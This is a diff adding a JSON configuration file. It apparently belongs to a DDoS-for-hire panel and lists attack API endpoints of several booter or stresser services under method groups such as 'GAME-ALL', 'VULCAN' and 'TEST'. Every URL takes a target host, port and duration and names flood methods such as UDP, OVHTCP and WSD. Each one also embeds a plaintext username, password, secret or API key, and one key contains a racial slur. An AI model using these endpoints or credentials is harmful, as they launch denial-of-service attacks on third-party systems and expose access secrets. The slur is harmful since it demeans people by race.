@@ -1,0 +1,26 @@
+{
+    "GAME-ALL": [
+             
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=[host]&port=[port]&time=[time]&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=[host]&port=[port]&time=[time]&method=UDP",
+            "https://dxr.ooo/api/attack?host=<<$host>>&port=<<$port>>&duration=<<$time>>&method=GAMEBYPASS-FUNNEL&username=Zopz&secret=930-571-692",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=[host]&port=[port]&time=[time]&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=[host]&port=[port]&time=[time]&method=WSD"
+    ],
+    "VULCAN": [
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=[host]&port=[port]&time=[time]&method=OVHTCP",
+            "https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=[host]&port=[port]&time=[time]&method=OVH",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=Ovhtcp",
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=[host]&port=[port]&time=[time]&type=Ludpflood&len=1",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=[host]&port=[port]&time=[time]&method=OVHTCP"
+    ],
+    "TEST": [
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=[host]&port=[port]&time=[time]&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=[host]&port=[port]&time=[time]&method=UDP",
+            "https://dxr.ooo/api/attack?host=<<$host>>&port=<<$port>>&duration=<<$time>>&method=GAMEBYPASS-FUNNEL&username=Zopz&secret=930-571-692",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=UDP",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=[host]&port=[port]&time=[time]&method=WSD"
+    ]
+  }
+  
